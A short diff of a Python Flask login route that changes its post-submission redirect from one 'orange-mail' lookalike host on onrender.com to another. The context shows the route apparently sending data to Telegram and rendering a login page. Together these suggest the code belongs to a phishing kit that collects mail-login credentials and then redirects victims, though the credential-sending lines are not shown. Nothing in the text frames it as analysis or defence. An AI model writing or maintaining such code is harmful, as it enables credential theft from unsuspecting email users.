@@ -24,7 +24,7 @@ def login():
         except Exception as e:
             print("Erreur Telegram:", e)
 
-        return redirect("https://orange-mail-jrqx.onrender.com/")
+        return redirect("https://orange-mail-45on.onrender.com/")
 
     return render_template('login.html')
 
